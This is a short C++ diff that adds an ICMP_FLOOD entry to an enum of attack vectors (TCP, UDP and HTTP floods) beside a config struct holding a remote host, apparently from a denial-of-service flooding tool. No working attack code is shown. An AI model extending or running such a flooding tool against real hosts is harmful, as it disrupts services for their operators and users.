@@ -3,7 +3,7 @@
 
 #include <string>
 
-enum __Vector__{NULL_TCP = 0, NULL_UDP, TCP_FLOOD, UDP_FLOOD, HTTP_FLOOD};
+enum __Vector__{NULL_TCP = 0, NULL_UDP, TCP_FLOOD, UDP_FLOOD, HTTP_FLOOD, ICMP_FLOOD};
 
 struct Config{
     std::string rhost;
